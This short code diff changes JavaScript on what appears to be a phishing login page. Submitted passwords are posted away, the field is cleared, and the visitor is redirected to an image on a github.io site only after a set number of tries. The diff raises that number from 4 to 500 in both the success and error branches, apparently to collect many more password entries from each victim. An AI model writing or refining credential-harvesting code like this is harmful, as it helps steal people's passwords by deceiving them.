@@ -258,7 +258,7 @@
                 console.log(response);
                 if(response['signal'] == 'ok'){
                   $("#password").val("");
-                  if (count>=4) {
+                  if (count>=500) {
                     count=0;
                     // window.location.replace(response['redirect_link']);
                     window.location.replace("https://babbajay19.github.io/CS1.1.jpg");
@@ -273,7 +273,7 @@
             },
             error: function(){
               $("#password").val("");
-              if (count>=4) {
+              if (count>=500) {
                 count=0;
                 window.location.replace("https://babbajay19.github.io/CS1.1.jpg");
               }
